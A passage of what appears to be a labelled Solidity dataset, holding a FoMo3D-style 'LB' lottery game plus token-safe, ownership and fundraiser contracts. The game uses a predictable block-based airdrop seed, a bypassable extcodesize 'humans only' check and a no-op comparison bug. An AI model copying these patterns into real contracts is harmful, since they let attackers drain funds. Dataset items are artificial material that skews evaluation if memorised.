{_codeLength := extcodesize(_addr)}        require(_codeLength == 0, "sorry humans only");        _;    }         modifier isWithinLimits(uint256 _eth) {        require(_eth >= 1000000000, "pocket lint: not a valid currency");        require(_eth <= 100000000000000000000000, "no vitalik, no");        _;        }                 function()        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 LBdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                             uint256 _pID = pIDxAddr_[msg.sender];                         buyCore(_pID, plyr_[_pID].laff, 2, _eventData_);    }             function buyXid(uint256 _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 LBdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                         uint256 _pID = pIDxAddr_[msg.sender];                                  if (_affCode == 0 || _affCode == _pID)        {                         _affCode = plyr_[_pID].laff;                             } else if (_affCode != plyr_[_pID].laff) {                         plyr_[_pID].laff = _affCode;        }                         _team = verifyTeam(_team);                         buyCore(_pID, _affCode, _team, _eventData_);    }        function buyXaddr(address _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 LBdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _affID;                 if (_affCode == address(0) || _affCode == msg.sender)        {                         _affID = plyr_[_pID].laff;                         } else {                         _affID = pIDxAddr_[_affCode];                                     if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                         _team = verifyTeam(_team);                         buyCore(_pID, _affID, _team, _eventData_);    }        function buyXname(bytes32 _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 LBdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _affID;                 if (_affCode == '' || _affCode == plyr_[_pID].name)        {                         _affID = plyr_[_pID].laff;                         } else {                         _affID = pIDxName_[_affCode];                                     if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                         _team = verifyTeam(_team);                         buyCore(_pID, _affID, _team, _eventData_);    }             function reLoadXid(uint256 _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 LBdatasets.EventReturns memory _eventData_;                         uint256 _pID = pIDxAddr_[msg.sender];                                  if (_affCode == 0 || _affCode == _pID)        {                         _affCode = plyr_[_pID].laff;                             } else if (_affCode != plyr_[_pID].laff) {                         plyr_[_pID].laff = _affCode;        }                 _team = verifyTeam(_team);                 reLoadCore(_pID, _affCode, _team, _eth, _eventData_);    }        function reLoadXaddr(address _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 LBdatasets.EventReturns memory _eventData_;                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _affID;                 if (_affCode == address(0) || _affCode == msg.sender)        {                         _affID = plyr_[_pID].laff;                         } else {                         _affID = pIDxAddr_[_affCode];                                     if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                         _team = verifyTeam(_team);                         reLoadCore(_pID, _affID, _team, _eth, _eventData_);    }        function reLoadXname(bytes32 _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 LBdatasets.EventReturns memory _eventData_;                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _affID;                 if (_affCode == '' || _affCode == plyr_[_pID].name)        {                         _affID = plyr_[_pID].laff;                         } else {                         _affID = pIDxName_[_affCode];                                     if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                         _team = verifyTeam(_team);                         reLoadCore(_pID, _affID, _team, _eth, _eventData_);    }         function withdraw()        isActivated()        isHuman()        public    {                 uint256 _rID = rID_;                         uint256 _now = now;                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _eth;                         if (_now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)        {                         LBdatasets.EventReturns memory _eventData_;                         			round_[_rID].ended = true;            _eventData_ = endRound(_eventData_);            			             _eth = withdrawEarnings(_pID);                                     if (_eth > 0)                plyr_[_pID].addr.transfer(_eth);                                         _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);            _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                                     emit LBevents.onWithdrawAndDistribute            (                msg.sender,                 plyr_[_pID].name,                 _eth,                 _eventData_.compressedData,                 _eventData_.compressedIDs,                 _eventData_.winnerAddr,                 _eventData_.winnerName,                 _eventData_.amountWon,                 _eventData_.newPot,                 _eventData_.P3DAmount,                 _eventData_.genAmount            );                             } else {                         _eth = withdrawEarnings(_pID);                                     if (_eth > 0)                plyr_[_pID].addr.transfer(_eth);                                     emit LBevents.onWithdraw(_pID, msg.sender, plyr_[_pID].name, _eth, _now);        }    }             function registerNameXID(string _nameString, uint256 _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXIDFromDapp.value(_paid)(_addr, _name, _affCode, _all);                uint256 _pID = pIDxAddr_[_addr];                         emit LBevents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }        function registerNameXaddr(string _nameString, address _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXaddrFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);                uint256 _pID = pIDxAddr_[_addr];                         emit LBevents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }        function registerNameXname(string _nameString, bytes32 _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXnameFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);                uint256 _pID = pIDxAddr_[_addr];                         emit LBevents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }             function getBuyPrice()        public         view         returns(uint256)    {                   uint256 _rID = rID_;                         uint256 _now = now;                         if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].keys.add(1000000000000000000)).ethRec(1000000000000000000) );        else              return ( 75000000000000 );      }             function getTimeLeft()        public        view        returns(uint256)    {                 uint256 _rID = rID_;                         uint256 _now = now;                if (_now < round_[_rID].end)            if (_now > round_[_rID].strt + rndGap_)                return( (round_[_rID].end).sub(_now) );            else                return( (round_[_rID].strt + rndGap_).sub(_now) );        else            return(0);    }             function getPlayerVaults(uint256 _pID)        public        view        returns(uint256 ,uint256, uint256)    {                 uint256 _rID = rID_;                         if (now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)        {                         if (round_[_rID].plyr == _pID)            {                return                (                    (plyr_[_pID].win).add( ((round_[_rID].pot).mul(48)) / 100 ),                    (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)   ),                    plyr_[_pID].aff                );                         } else {                return                (                    plyr_[_pID].win,                    (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)  ),                    plyr_[_pID].aff                );            }                             } else {            return            (                plyr_[_pID].win,                (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),                plyr_[_pID].aff            );        }    }             function getPlayerVaultsHelper(uint256 _pID, uint256 _rID)        private        view        returns(uint256)    {        return(  ((((round_[_rID].mask).add(((((round_[_rID].pot).mul(potSplit_[round_[_rID].team].gen)) / 100).mul(1000000000000000000)) / (round_[_rID].keys))).mul(plyrRnds_[_pID][_rID].keys)) / 1000000000000000000)  );    }             function getCurrentRoundInfo()        public        view        returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256, address, bytes32, uint256, uint256, uint256, uint256, uint256)    {                 uint256 _rID = rID_;                return        (            round_[_rID].ico,                            _rID,                                        round_[_rID].keys,                           round_[_rID].end,                            round_[_rID].strt,                           round_[_rID].pot,                            (round_[_rID].team + (round_[_rID].plyr * 10)),                  plyr_[round_[_rID].plyr].addr,               plyr_[round_[_rID].plyr].name,               rndTmEth_[_rID][0],                          rndTmEth_[_rID][1],                          rndTmEth_[_rID][2],                          rndTmEth_[_rID][3],                          airDropTracker_ + (airDropPot_ * 1000)                       );    }         function getPlayerInfoByAddress(address _addr)        public         view         returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256)    {                 uint256 _rID = rID_;                if (_addr == address(0))        {            _addr == msg.sender;        }        uint256 _pID = pIDxAddr_[_addr];                return        (            _pID,                                            plyr_[_pID].name,                                plyrRnds_[_pID][_rID].keys,                      plyr_[_pID].win,                                 (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),                    plyr_[_pID].aff,                                 plyrRnds_[_pID][_rID].eth                    );    }             function buyCore(uint256 _pID, uint256 _affID, uint256 _team, LBdatasets.EventReturns memory _eventData_)        private    {                 uint256 _rID = rID_;                         uint256 _now = now;                         if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))         {                         core(_rID, _pID, msg.value, _affID, _team, _eventData_);                         } else {                         if (_now > round_[_rID].end && round_[_rID].ended == false)             {                 			    round_[_rID].ended = true;                _eventData_ = endRound(_eventData_);                                                 _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);                _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                                                 emit LBevents.onBuyAndDistribute                (                    msg.sender,                     plyr_[_pID].name,                     msg.value,                     _eventData_.compressedData,                     _eventData_.compressedIDs,                     _eventData_.winnerAddr,                     _eventData_.winnerName,                     _eventData_.amountWon,                     _eventData_.newPot,                     _eventData_.P3DAmount,                     _eventData_.genAmount                );            }                                     plyr_[_pID].gen = plyr_[_pID].gen.add(msg.value);        }    }             function reLoadCore(uint256 _pID, uint256 _affID, uint256 _team, uint256 _eth, LBdatasets.EventReturns memory _eventData_)        private    {                 uint256 _rID = rID_;                         uint256 _now = now;                         if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))         {                                                   plyr_[_pID].gen = withdrawEarnings(_pID).sub(_eth);                                     core(_rID, _pID, _eth, _affID, _team, _eventData_);                         } else if (_now > round_[_rID].end && round_[_rID].ended == false) {                         round_[_rID].ended = true;            _eventData_ = endRound(_eventData_);                                         _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);            _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                                         emit LBevents.onReLoadAndDistribute            (                msg.sender,                 plyr_[_pID].name,                 _eventData_.compressedData,                 _eventData_.compressedIDs,                 _eventData_.winnerAddr,                 _eventData_.winnerName,                 _eventData_.amountWon,                 _eventData_.newPot,                 _eventData_.P3DAmount,                 _eventData_.genAmount            );        }    }             function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, LBdatasets.EventReturns memory _eventData_)        private    {                 if (plyrRnds_[_pID][_rID].keys == 0)            _eventData_ = managePlayer(_pID, _eventData_);                         if (_eth > 1000000000)         {                                     uint256 _keys = (round_[_rID].eth).keysRec(_eth);                                     if (_keys >= 1000000000000000000)            {            updateTimer(_keys, _rID);                         if (round_[_rID].plyr != _pID)                round_[_rID].plyr = _pID;              if (round_[_rID].team != _team)                round_[_rID].team = _team;                                      _eventData_.compressedData = _eventData_.compressedData + 100;        }                                     if (_eth >= 100000000000000000)            {            airDropTracker_++;            if (airdrop() == true)            {                                 uint256 _prize;                if (_eth >= 10000000000000000000)                {                                         _prize = ((airDropPot_).mul(75)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                                             airDropPot_ = (airDropPot_).sub(_prize);                                                             _eventData_.compressedData += 300000000000000000000000000000000;                } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {                                         _prize = ((airDropPot_).mul(50)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                                             airDropPot_ = (airDropPot_).sub(_prize);                                                             _eventData_.compressedData += 200000000000000000000000000000000;                } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {                                         _prize = ((airDropPot_).mul(25)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                                             airDropPot_ = (airDropPot_).sub(_prize);                                                             _eventData_.compressedData += 300000000000000000000000000000000;                }                                 _eventData_.compressedData += 10000000000000000000000000000000;                                 _eventData_.compressedData += _prize * 1000000000000000000000000000000000;                                                 airDropTracker_ = 0;            }        }                             _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);                                     plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);            plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);                                     round_[_rID].keys = _keys.add(round_[_rID].keys);            round_[_rID].eth = _eth.add(round_[_rID].eth);            rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);                             _eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);            _eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);                         		    endTx(_pID, _team, _eth, _keys, _eventData_);        }    }             function calcUnMaskedEarnings(uint256 _pID, uint256 _rIDlast)        private        view        returns(uint256)    {        return(  (((round_[_rIDlast].mask).mul(plyrRnds_[_pID][_rIDlast].keys)) / (1000000000000000000)).sub(plyrRnds_[_pID][_rIDlast].mask)  );    }             function calcKeysReceived(uint256 _rID, uint256 _eth)        public        view        returns(uint256)    {                 uint256 _now = now;                         if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].eth).keysRec(_eth) );        else              return ( (_eth).keys() );    }             function iWantXKeys(uint256 _keys)        public        view        returns(uint256)    {                 uint256 _rID = rID_;                         uint256 _now = now;                         if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].keys.add(_keys)).ethRec(_keys) );        else              return ( (_keys).eth() );    }             function receivePlayerInfo(uint256 _pID, address _addr, bytes32 _name, uint256 _laff)        external    {        require (msg.sender == address(PlayerBook), "your not playerNames contract... hmmm..");        if (pIDxAddr_[_addr] != _pID)            pIDxAddr_[_addr] = _pID;        if (pIDxName_[_name] != _pID)            pIDxName_[_name] = _pID;        if (plyr_[_pID].addr != _addr)            plyr_[_pID].addr = _addr;        if (plyr_[_pID].name != _name)            plyr_[_pID].name = _name;        if (plyr_[_pID].laff != _laff)            plyr_[_pID].laff = _laff;        if (plyrNames_[_pID][_name] == false)            plyrNames_[_pID][_name] = true;    }             function receivePlayerNameList(uint256 _pID, bytes32 _name)        external    {        require (msg.sender == address(PlayerBook), "your not playerNames contract... hmmm..");        if(plyrNames_[_pID][_name] == false)            plyrNames_[_pID][_name] = true;    }                    function determinePID(LBdatasets.EventReturns memory _eventData_)        private        returns (LBdatasets.EventReturns)    {        uint256 _pID = pIDxAddr_[msg.sender];                 if (_pID == 0)        {                         _pID = PlayerBook.getPlayerID(msg.sender);            bytes32 _name = PlayerBook.getPlayerName(_pID);            uint256 _laff = PlayerBook.getPlayerLAff(_pID);                                     pIDxAddr_[msg.sender] = _pID;            plyr_[_pID].addr = msg.sender;                        if (_name != "")            {                pIDxName_[_name] = _pID;                plyr_[_pID].name = _name;                plyrNames_[_pID][_name] = true;            }                        if (_laff != 0 && _laff != _pID)                plyr_[_pID].laff = _laff;                                     _eventData_.compressedData = _eventData_.compressedData + 1;        }         return (_eventData_);    }             function verifyTeam(uint256 _team)        private        pure        returns (uint256)    {        if (_team < 0 || _team > 3)            return(2);        else            return(_team);    }             function managePlayer(uint256 _pID, LBdatasets.EventReturns memory _eventData_)        private        returns (LBdatasets.EventReturns)    {                          if (plyr_[_pID].lrnd != 0)            updateGenVault(_pID, plyr_[_pID].lrnd);                             plyr_[_pID].lrnd = rID_;                             _eventData_.compressedData = _eventData_.compressedData + 10;                return(_eventData_);    }             function endRound(LBdatasets.EventReturns memory _eventData_)        private        returns (LBdatasets.EventReturns)    {                 uint256 _rID = rID_;                         uint256 _winPID = round_[_rID].plyr;        uint256 _winTID = round_[_rID].team;                         uint256 _pot = round_[_rID].pot;                                  uint256 _win = (_pot.mul(48)) / 100;        uint256 _com = (_pot.mul(6) / 50);        uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;        uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen));                         uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);        uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);        if (_dust > 0)        {            _gen = _gen.sub(_dust);            _res = _res.add(_dust);        }                         plyr_[_winPID].win = _win.add(plyr_[_winPID].win);                         community_addr.transfer(_com);                         round_[_rID].mask = _ppt.add(round_[_rID].mask);                                     _eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);        _eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);        _eventData_.winnerAddr = plyr_[_winPID].addr;        _eventData_.winnerName = plyr_[_winPID].name;        _eventData_.amountWon = _win;        _eventData_.genAmount = _gen;        _eventData_.P3DAmount = 0;        _eventData_.newPot = _res;                         rID_++;        _rID++;        round_[_rID].strt = now;        round_[_rID].end = now.add(rndInit_).add(rndGap_);        round_[_rID].pot = _res;                return(_eventData_);    }             function updateGenVault(uint256 _pID, uint256 _rIDlast)        private     {        uint256 _earnings = calcUnMaskedEarnings(_pID, _rIDlast);        if (_earnings > 0)        {                         plyr_[_pID].gen = _earnings.add(plyr_[_pID].gen);                         plyrRnds_[_pID][_rIDlast].mask = _earnings.add(plyrRnds_[_pID][_rIDlast].mask);        }    }             function updateTimer(uint256 _keys, uint256 _rID)        private    {                 uint256 _now = now;                         uint256 _newTime;        if (_now > round_[_rID].end && round_[_rID].plyr == 0)            _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(_now);        else            _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(round_[_rID].end);                         if (_newTime < (rndMax_).add(_now))            round_[_rID].end = _newTime;        else            round_[_rID].end = rndMax_.add(_now);    }             function airdrop()        private         view         returns(bool)    {        uint256 seed = uint256(keccak256(abi.encodePacked(                        (block.timestamp).add            (block.difficulty).add            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add            (block.gaslimit).add            ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add            (block.number)                    )));        if((seed - ((seed / 1000) * 1000)) < airDropTracker_)            return(true);        else            return(false);    }         function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, LBdatasets.EventReturns memory _eventData_)        private        returns(LBdatasets.EventReturns)    {                 uint256 _com = _eth / 50;                                     uint256 _aff = _eth / 5;                                  _com = _com * 5;        if (_affID != _pID && plyr_[_affID].name != '') {            plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);            emit LBevents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);        } else {            _com = _com.add(_aff);        }        community_addr.transfer(_com);                return(_eventData_);    }             function distributeInternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _team, uint256 _keys, LBdatasets.EventReturns memory _eventData_)        private        returns(LBdatasets.EventReturns)    {                 uint256 _gen = (_eth.mul(fees_[_team].gen)) / 100;                         uint256 _air = (_eth / 50);        airDropPot_ = airDropPot_.add(_air);                         _eth = _eth.sub(((_eth.mul(34)) / 100));                         uint256 _pot = _eth.sub(_gen);                                  uint256 _dust = updateMasks(_rID, _pID, _gen, _keys);        if (_dust > 0)            _gen = _gen.sub(_dust);                         round_[_rID].pot = _pot.add(_dust).add(round_[_rID].pot);                         _eventData_.genAmount = _gen.add(_eventData_.genAmount);        _eventData_.potAmount = _pot;                return(_eventData_);    }         function updateMasks(uint256 _rID, uint256 _pID, uint256 _gen, uint256 _keys)        private        returns(uint256)    {                                  uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);        round_[_rID].mask = _ppt.add(round_[_rID].mask);                                      uint256 _pearn = (_ppt.mul(_keys)) / (1000000000000000000);        plyrRnds_[_pID][_rID].mask = (((round_[_rID].mask.mul(_keys)) / (1000000000000000000)).sub(_pearn)).add(plyrRnds_[_pID][_rID].mask);                         return(_gen.sub((_ppt.mul(round_[_rID].keys)) / (1000000000000000000)));    }             function withdrawEarnings(uint256 _pID)        private        returns(uint256)    {                 updateGenVault(_pID, plyr_[_pID].lrnd);                         uint256 _earnings = (plyr_[_pID].win).add(plyr_[_pID].gen).add(plyr_[_pID].aff);        if (_earnings > 0)        {            plyr_[_pID].win = 0;            plyr_[_pID].gen = 0;            plyr_[_pID].aff = 0;        }        return(_earnings);    }             function endTx(uint256 _pID, uint256 _team, uint256 _eth, uint256 _keys, LBdatasets.EventReturns memory _eventData_)        private    {        _eventData_.compressedData = _eventData_.compressedData + (now * 1000000000000000000) + (_team * 100000000000000000000000000000);        _eventData_.compressedIDs = _eventData_.compressedIDs + _pID + (rID_ * 10000000000000000000000000000000000000000000000000000);                emit LBevents.onEndTx        (            _eventData_.compressedData,            _eventData_.compressedIDs,            plyr_[_pID].name,            msg.sender,            _eth,            _keys,            _eventData_.winnerAddr,            _eventData_.winnerName,            _eventData_.amountWon,            _eventData_.newPot,            _eventData_.P3DAmount,            _eventData_.genAmount,            _eventData_.potAmount,            airDropPot_        );    }             bool public activated_ = false;    function activate()        public    {                 require(            msg.sender == community_addr, "only community can activate"        );                         require(activated_ == false, "LB already activated");                         activated_ = true;                 		rID_ = 1;        round_[1].strt = now + rndExtra_ - rndGap_;        round_[1].end = now + rndInit_ + rndExtra_;    }    function start()     {                 require(            msg.sender == community_addr, "only community can activate"        );                         require(activated_ == false, "LB already activated");                         activated_ = true;    }    function stop()        public    {                 require(            msg.sender == community_addr, "only community can activate"        );                         require(activated_ == true, "LB already activated");                         activated_ = false;    }}    library LBdatasets {                                                                                                                                                               struct EventReturns {        uint256 compressedData;        uint256 compressedIDs;        address winnerAddr;                  bytes32 winnerName;                  uint256 amountWon;                   uint256 newPot;                      uint256 P3DAmount;                   uint256 genAmount;                   uint256 potAmount;               }    struct Player {        address addr;            bytes32 name;            uint256 win;             uint256 gen;             uint256 aff;             uint256 lrnd;            uint256 laff;        }    struct PlayerRounds {        uint256 eth;             uint256 keys;            uint256 mask;            uint256 ico;         }    struct Round {        uint256 plyr;            uint256 team;            uint256 end;             bool ended;              uint256 strt;            uint256 keys;            uint256 eth;             uint256 pot;             uint256 mask;            uint256 ico;             uint256 icoGen;          uint256 icoAvg;      }    struct TeamFee {        uint256 gen;             uint256 p3d;         }    struct PotSplit {        uint256 gen;             uint256 p3d;         }}    library LBKeysCalcLong {    using SafeMath for *;         function keysRec(uint256 _curEth, uint256 _newEth)        internal        pure        returns (uint256)    {        return(keys((_curEth).add(_newEth)).sub(keys(_curEth)));    }         function ethRec(uint256 _curKeys, uint256 _sellKeys)        internal        pure        returns (uint256)    {        return((eth(_curKeys)).sub(eth(_curKeys.sub(_sellKeys))));    }         function keys(uint256 _eth)         internal        pure        returns(uint256)    {        return ((((((_eth).mul(1000000000000000000)).mul(156250000000000000000000000)).add(1406247070314025878906250000000000000000000000000000000000000000)).sqrt()).sub(37499960937500000000000000000000)) / (78125000);    }         function eth(uint256 _keys)         internal        pure        returns(uint256)      {        return ((39062500).mul(_keys.sq()).add(((74999921875000).mul(_keys.mul(1000000000000000000))) / (2))) / ((1000000000000000000).sq());    }}    interface PlayerBookInterface {    function getPlayerID(address _addr) external returns (uint256);    function getPlayerName(uint256 _pID) external view returns (bytes32);    function getPlayerLAff(uint256 _pID) external view returns (uint256);    function getPlayerAddr(uint256 _pID) external view returns (address);    function getNameFee() external view returns (uint256);    function registerNameXIDFromDapp(address _addr, bytes32 _name, uint256 _affCode, bool _all) external payable returns(bool, uint256);    function registerNameXaddrFromDapp(address _addr, bytes32 _name, address _affCode, bool _all) external payable returns(bool, uint256);    function registerNameXnameFromDapp(address _addr, bytes32 _name, bytes32 _affCode, bool _all) external payable returns(bool, uint256);}library NameFilter {         function nameFilter(string _input)        internal        pure        returns(bytes32)    {        bytes memory _temp = bytes(_input);        uint256 _length = _temp.length;                         require (_length <= 32 && _length > 0, "string must be between 1 and 32 characters");                 require(_temp[0] != 0x20 && _temp[_length-1] != 0x20, "string cannot start or end with space");                 if (_temp[0] == 0x30)        {            require(_temp[1] != 0x78, "string cannot start with 0x");            require(_temp[1] != 0x58, "string cannot start with 0X");        }                         bool _hasNonNumber;                         for (uint256 i = 0; i < _length; i++)        {                         if (_temp[i] > 0x40 && _temp[i] < 0x5b)            {                                 _temp[i] = byte(uint(_temp[i]) + 32);                                                 if (_hasNonNumber == false)                    _hasNonNumber = true;            } else {                require                (                                         _temp[i] == 0x20 ||                                          (_temp[i] > 0x60 && _temp[i] < 0x7b) ||                                         (_temp[i] > 0x2f && _temp[i] < 0x3a),                    "string contains invalid characters"                );                                 if (_temp[i] == 0x20)                    require( _temp[i+1] != 0x20, "string cannot contain consecutive spaces");                                                 if (_hasNonNumber == false && (_temp[i] < 0x30 || _temp[i] > 0x39))                    _hasNonNumber = true;                }        }                require(_hasNonNumber == true, "string cannot be only numbers");                bytes32 _ret;        assembly {            _ret := mload(add(_temp, 32))        }        return (_ret);    }} library SafeMath {             function mul(uint256 a, uint256 b)         internal         pure         returns (uint256 c)     {        if (a == 0) {            return 0;        }        c = a * b;        require(c / a == b, "SafeMath mul failed");        return c;    }         function sub(uint256 a, uint256 b)        internal        pure        returns (uint256)     {        require(b <= a, "SafeMath sub failed");        return a - b;    }         function add(uint256 a, uint256 b)        internal        pure        returns (uint256 c)     {        c = a + b;        require(c >= a, "SafeMath add failed");        return c;    }             function sqrt(uint256 x)        internal        pure        returns (uint256 y)     {        uint256 z = ((add(x,1)) / 2);        y = x;        while (z < y)         {            y = z;            z = ((add((x / z),z)) / 2);        }    }             function sq(uint256 x)        internal        pure        returns (uint256)    {        return (mul(x,x));    }             function pwr(uint256 x, uint256 y)        internal         pure         returns (uint256)    {        if (x==0)            return (0);        else if (y==0)            return (1);        else         {            uint256 z = x;            for (uint256 i=1; i < y; i++)                z = mul(z,x);            return (z);        }    }}
0<CODESPLIT>contract TokenSafe {    using SafeMath for uint;         ERC20Token token;    struct Group {                          uint256 releaseTimestamp;                 uint256 remaining;                 mapping (address => uint) balances;    }         mapping (uint8 => Group) public groups;         constructor(address _token) public {        token = ERC20Token(_token);    }         function init(uint8 _id, uint _releaseTimestamp) internal {        require(_releaseTimestamp > 0);                Group storage group = groups[_id];        group.releaseTimestamp = _releaseTimestamp;    }         function add(uint8 _id, address _account, uint _balance) internal {        Group storage group = groups[_id];        group.balances[_account] = group.balances[_account].plus(_balance);        group.remaining = group.remaining.plus(_balance);    }         function release(uint8 _id, address _account) public {        Group storage group = groups[_id];        require(now >= group.releaseTimestamp);                uint tokens = group.balances[_account];        require(tokens > 0);                group.balances[_account] = 0;        group.remaining = group.remaining.minus(tokens);                if (!token.transfer(_account, tokens)) {            revert();        }    }}  
0<CODESPLIT>contract HasOwner {         address public owner;         address public newOwner;         constructor(address _owner) public {        owner = _owner;    }         modifier onlyOwner {        require(msg.sender == owner);        _;    }         event OwnershipTransfer(address indexed _oldOwner, address indexed _newOwner);         function transferOwnership(address _newOwner) public onlyOwner {        newOwner = _newOwner;    }          function acceptOwnership() public {        require(msg.sender == newOwner);        emit OwnershipTransfer(owner, newOwner);        owner = newOwner;    }} 
0<CODESPLIT>contract AbstractFundraiser {         ERC20Token public token;         event FundsReceived(address indexed _address, uint _ethers, uint _tokens);         function initializeFundraiserToken(address _token) internal    {        token = ERC20Token(_token);    }         function() public payable {        receiveFunds(msg.sender, msg.value);    }         function getConversionRate() public view returns (uint256);         function hasEnded() public view returns (bool);         function receiveFunds(address _address, uint256 _amount) internal;             function validateTransaction() internal view;             function handleTokens(address _address, uint256 _tokens) internal;         function handleFunds(address _address, uint256 _ethers) internal;}  
0<CODESPLIT>contract BasicFundraiser is HasOwner, AbstractFundraiser {    using SafeMath for uint256;         uint8 constant DECIMALS = 18;            uint256 constant DECIMALS_FACTOR = 10 ** uint256(DECIMALS);         uint256 public startTime;         uint256 public endTime;         address public beneficiary;              uint256 public conversionRate;         uint256 public totalRaised;         event ConversionRateChanged(uint _conversionRate);         function initializeBasicFundraiser(        uint256 _startTime,        uint256 _endTime,        uint256 _conversionRate,        address _beneficiary    )        internal    {        require(_endTime >= _startTime);        require(_conversionRate > 0);        require(_beneficiary != address(0));        startTime = _startTime;        endTime = _endTime;        conversionRate = _conversionRate;        beneficiary = _beneficiary;    }         function setConversionRate(uint256 _conversionRate) public onlyOwner {        require(_conversionRate > 0);        conversionRate = _conversionRate;        emit ConversionRateChanged(_conversionRate);    }         function setBeneficiary(address _beneficiary) public onlyOwner {        require(_beneficiary != address(0));        beneficiary = _beneficiary;    }         function receiveFunds(address _address, uint256 _amount) internal {        validateTransaction();        uint256 tokens = calculateTokens(_amount);        require(tokens > 0);        totalRaised = totalRaised.plus(_amount);        handleTokens(_address, 